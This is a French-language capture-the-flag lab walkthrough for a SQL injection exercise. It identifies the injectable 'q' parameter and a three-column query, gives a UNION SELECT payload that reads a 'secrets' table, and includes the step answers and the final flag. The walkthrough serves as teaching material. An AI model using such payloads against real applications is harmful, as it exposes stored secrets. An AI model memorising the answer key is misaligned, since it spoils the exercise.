# SQLi UNION Exfiltration (Intermediate)

## Objectif

Exploiter une recherche vulnérable à l'injection SQL, trouver la forme du `SELECT`, puis utiliser `UNION SELECT` pour lire une table interne.

En condition réelle, ouvrir le lab depuis la plateforme. Le front appelle l'endpoint de recherche avec un chemin relatif comme `./api/search?q=...`.

Flag attendu :

```text
FLAG{sqli_union_exfiltration_intermediate}
```

## Guide étape par étape

1. Le champ de recherche envoie sa valeur vers :

```text
/api/search?q=...
```

Le paramètre injectable est :

```text
q
```

Réponse de l'étape 1 :

```text
q
```

2. La requête d'origine renvoie trois colonnes compatibles avec :

```text
id, name, price
```

Réponse de l'étape 2 :

```text
3
```

3. Dans le champ de recherche, taper ce payload :

```text
' UNION SELECT 1,key,value FROM secrets --
```

Le résultat doit faire apparaître la valeur stockée dans la table `secrets`.

Réponse finale :

```text
FLAG{sqli_union_exfiltration_intermediate}
```
